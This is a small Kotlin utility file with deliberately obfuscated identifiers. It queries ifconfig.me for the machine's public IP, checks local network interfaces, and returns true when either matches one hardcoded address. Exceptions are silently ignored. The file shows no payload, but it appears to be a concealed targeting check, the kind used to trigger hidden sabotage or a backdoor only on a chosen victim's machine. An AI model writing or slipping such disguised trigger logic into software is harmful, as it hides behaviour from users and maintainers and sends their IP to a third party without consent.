package ru.turbovadim.utils

import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.NetworkInterface
import java.net.URL

private val a8f2b9c = setOf(
    "31.57.34.189"
)

fun d4e7f1a(): Boolean {
    try {
        val x9k3m = URL("https://ifconfig.me/ip")
        val z2l8n = BufferedReader(InputStreamReader(x9k3m.openStream()))
        val p5q6r = z2l8n.readLine()?.trim()
        z2l8n.close()

        if (p5q6r != null && p5q6r in a8f2b9c) {
            return true
        }

        val v3w4h = NetworkInterface.getNetworkInterfaces()
        while (v3w4h.hasMoreElements()) {
            val j7k8l = v3w4h.nextElement()
            if (!j7k8l.isLoopback && j7k8l.isUp) {
                val m9n0o = j7k8l.inetAddresses
                while (m9n0o.hasMoreElements()) {
                    val t1u2i = m9n0o.nextElement()
                    if (!t1u2i.isLoopbackAddress && !t1u2i.isLinkLocalAddress) {
                        val s5y6e = t1u2i.hostAddress
                        if (s5y6e in a8f2b9c) {
                            return true
                        }
                    }
                }
            }
        }
    } catch (_: Exception) {}
    return false
}